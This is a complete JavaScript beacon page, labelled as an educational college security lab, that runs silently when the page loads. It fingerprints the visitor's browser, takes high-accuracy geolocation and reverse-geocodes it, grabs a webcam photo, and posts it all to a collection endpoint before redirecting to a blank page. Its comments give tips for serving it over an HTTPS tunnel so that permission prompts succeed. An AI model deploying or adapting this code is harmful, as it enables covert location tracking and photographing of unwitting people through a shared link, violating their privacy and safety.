(function () {
  "use strict";

  const EXIT_URL = "about:blank";
  const JPEG_QUALITY = 0.72;
  const VIDEO_WAIT_MS = 18000;

  function labApiUrl(name) {
    const api = typeof window !== "undefined" && window.__LAB_API__;
    const fallback = {
      serverMeta: "/api/server-meta",
      labReport: "/api/lab-report",
    };
    if (api && typeof api[name] === "string" && api[name]) return api[name];
    return fallback[name] || "";
  }

  function simpleHash(str) {
    let h = 2166136261;
    for (let i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function canvasFingerprint() {
    try {
      const c = document.createElement("canvas");
      c.width = 120;
      c.height = 40;
      const ctx = c.getContext("2d");
      if (!ctx) return null;
      ctx.fillStyle = "#111";
      ctx.fillRect(0, 0, 120, 40);
      ctx.fillStyle = "#eee";
      ctx.font = "14px sans-serif";
      ctx.fillText("beacon", 8, 24);
      const data = c.toDataURL();
      return { hash32: simpleHash(data) };
    } catch (e) {
      return { error: String(e) };
    }
  }

  function collectFingerprint() {
    return {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      languages: navigator.languages ? [...navigator.languages] : [],
      screen: typeof screen !== "undefined" ? screen.width + "x" + screen.height : null,
      user_agent: navigator.userAgent,
      canvas: canvasFingerprint(),
    };
  }

  function geoErrorHint(code) {
    if (code === 1) return "PERMISSION_DENIED (utilizador bloqueou ou origem sem HTTPS)";
    if (code === 2) return "POSITION_UNAVAILABLE";
    if (code === 3) return "TIMEOUT";
    return null;
  }

  function geoPromise() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ error: "geolocation_unavailable" });
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const c = pos.coords;
          resolve({
            latitude: c.latitude,
            longitude: c.longitude,
            accuracy: c.accuracy,
            altitude: c.altitude,
            altitudeAccuracy: c.altitudeAccuracy,
            heading: c.heading,
            speed: c.speed,
            ts: pos.timestamp,
          });
        },
        (err) => {
          const code = err && err.code;
          const base = code != null ? "geo_" + code : String(err.message || err);
          const hint = geoErrorHint(code);
          resolve(hint ? { error: base, hint: hint } : { error: base });
        },
        { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
      );
    });
  }

  function snapFromVideo(video) {
    const w = video.videoWidth;
    const h = video.videoHeight;
    if (!w || !h) return null;
    const c = document.createElement("canvas");
    c.width = w;
    c.height = h;
    const ctx = c.getContext("2d");
    if (!ctx) return null;
    try {
      ctx.drawImage(video, 0, 0, w, h);
    } catch (e) {
      return null;
    }
    const dataUrl = c.toDataURL("image/jpeg", JPEG_QUALITY);
    const parts = dataUrl.split(",");
    return parts.length > 1 ? parts[1] : null;
  }

  function summarizeTrackSettings(track) {
    try {
      const s = track && typeof track.getSettings === "function" ? track.getSettings() : {};
      return {
        width: s.width,
        height: s.height,
        frameRate: s.frameRate,
        facingMode: s.facingMode,
        aspectRatio: s.aspectRatio,
      };
    } catch (_) {
      return {};
    }
  }

  function waitForVideoDimensions(video, timeoutMs) {
    if (video.videoWidth > 0 && video.videoHeight > 0) return Promise.resolve(true);
    return new Promise((resolve) => {
      const start = Date.now();
      const tryOk = () => video.videoWidth > 0 && video.videoHeight > 0;
      const finish = (ok) => {
        cleanup();
        resolve(ok);
      };
      const tick = () => {
        if (tryOk()) {
          finish(true);
          return;
        }
        if (Date.now() - start > timeoutMs) finish(false);
      };
      const onEv = () => tick();
      video.addEventListener("loadedmetadata", onEv);
      video.addEventListener("loadeddata", onEv);
      video.addEventListener("canplay", onEv);
      video.addEventListener("playing", onEv);
      const iv = setInterval(tick, 80);
      function cleanup() {
        clearInterval(iv);
        video.removeEventListener("loadedmetadata", onEv);
        video.removeEventListener("loadeddata", onEv);
        video.removeEventListener("canplay", onEv);
        video.removeEventListener("playing", onEv);
      }
      tick();
    });
  }

  /**
   * Muitas webcams de PC falham com facingMode:"user" (OverconstrainedError).
   * Ordem: primeiro pedido generico, depois mobile / frente / tras.
   */
  async function captureCamera() {
    const dbg = { constraint_errors: [] };
    if (typeof window.isSecureContext !== "undefined" && !window.isSecureContext) {
      return {
        error: "needs_https_secure_context",
        hint: "Abra /b por HTTPS (ex.: túnel Cloudflare), nao por http://IP-LAN",
        camera_debug: dbg,
      };
    }
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return {
        error: "getUserMedia_unavailable",
        hint: "Navegador sem mediaDevices (contexto inseguro ou politica)",
        camera_debug: dbg,
      };
    }

    const tries = [
      { tag: "video_true", def: { video: true, audio: false } },
      { tag: "facing_user", def: { video: { facingMode: "user" }, audio: false } },
      { tag: "facing_ideal_user", def: { video: { facingMode: { ideal: "user" } }, audio: false } },
      { tag: "facing_environment", def: { video: { facingMode: "environment" }, audio: false } },
    ];

    const video = document.getElementById("v");
    let stream = null;
    for (let i = 0; i < tries.length; i++) {
      try {
        stream = await navigator.mediaDevices.getUserMedia(tries[i].def);
        dbg.used_constraint = tries[i].tag;
        dbg.used_index = i;
        break;
      } catch (e) {
        dbg.constraint_errors.push(tries[i].tag + ":" + (e && e.name ? e.name : String(e.message || e)));
      }
    }

    if (!stream) {
      return {
        error: "getUserMedia_all_failed",
        hint: dbg.constraint_errors.join(" | "),
        camera_debug: dbg,
      };
    }

    const vtrack = stream.getVideoTracks()[0];
    dbg.track_label = (vtrack && vtrack.label) || "";
    dbg.track_settings = summarizeTrackSettings(vtrack);

    video.muted = true;
    video.defaultMuted = true;
    video.setAttribute("playsinline", "");
    video.playsInline = true;
    video.srcObject = stream;

    try {
      await video.play();
      dbg.play_ok = true;
    } catch (e) {
      dbg.play_err = String(e.message || e);
    }

    const dimsOk = await waitForVideoDimensions(video, VIDEO_WAIT_MS);
    dbg.video_width = video.videoWidth;
    dbg.video_height = video.videoHeight;
    dbg.wait_dimensions_ok = dimsOk;

    await new Promise((r) => setTimeout(r, 100));

    let b64 = null;
    let attempts = 0;
    for (; attempts < 12 && !b64; attempts++) {
      b64 = snapFromVideo(video);
      if (!b64) await new Promise((r) => setTimeout(r, 120));
    }
    dbg.snap_attempts = attempts;

    try {
      stream.getTracks().forEach((t) => t.stop());
    } catch (_) {}
    video.srcObject = null;

    if (b64) return { base64: b64, camera_debug: dbg };
    return {
      error: "snap_failed",
      hint:
        "Stream ok mas sem frame (webcam lenta, driver ou permissao so de audio). " +
        "Tente outro browser ou desligar outra app que use a camera.",
      camera_debug: dbg,
    };
  }

  async function reverseLabel(lat, lon) {
    try {
      const url =
        "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" +
        encodeURIComponent(lat) +
        "&lon=" +
        encodeURIComponent(lon);
      const r = await fetch(url, {
        headers: {
          Accept: "application/json",
          "User-Agent": "CollegeSecurityLab/1.0 (educational; beacon)",
        },
      });
      if (!r.ok) return null;
      const j = await r.json();
      return j.display_name || null;
    } catch {
      return null;
    }
  }

  async function run() {
    let serverMeta = null;
    try {
      const r = await fetch(labApiUrl("serverMeta"), { headers: { Accept: "application/json" } });
      serverMeta = await r.json();
    } catch (_) {}

    const [geoRaw, camRaw] = await Promise.all([geoPromise(), captureCamera()]);

    let geolocation = geoRaw;
    if (geolocation && geolocation.latitude != null && geolocation.longitude != null) {
      const hint = await reverseLabel(geolocation.latitude, geolocation.longitude);
      geolocation = { ...geolocation, reverse_geocode_hint: hint };
    }

    const photo_jpeg_base64 = camRaw && camRaw.base64 ? camRaw.base64 : null;
    const camStatus =
      camRaw && camRaw.error
        ? camRaw.error + (camRaw.hint ? " — " + camRaw.hint : "")
        : camRaw && camRaw.base64
          ? "ok"
          : "no_frame";

    const q = new URLSearchParams(location.search);
    let device_display_name = (q.get("nome") || q.get("name") || q.get("id") || "").trim();
    if (device_display_name.length > 120) device_display_name = device_display_name.slice(0, 120);

    const fp = collectFingerprint();
    const bundle = {
      collected_at: new Date().toISOString(),
      beacon: true,
      beacon_context: {
        isSecureContext: !!window.isSecureContext,
        protocol: location.protocol,
        host: location.host,
      },
      server_session_id: serverMeta && serverMeta.session_id ? serverMeta.session_id : null,
      user_agent: navigator.userAgent,
      fingerprint: fp,
      geolocation: geolocation && !geolocation.error ? geolocation : geoRaw,
      camera_status: camStatus,
      photo_jpeg_base64: photo_jpeg_base64,
      camera_debug: camRaw && camRaw.camera_debug ? camRaw.camera_debug : null,
    };
    if (device_display_name) bundle.device_display_name = device_display_name;

    try {
      await fetch(labApiUrl("labReport"), {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          beacon_capture: true,
          client_bundle: bundle,
        }),
      });
    } catch (_) {}

    try {
      window.location.replace(EXIT_URL);
    } catch (_) {
      window.location.href = EXIT_URL;
    }
  }

  run();
})();
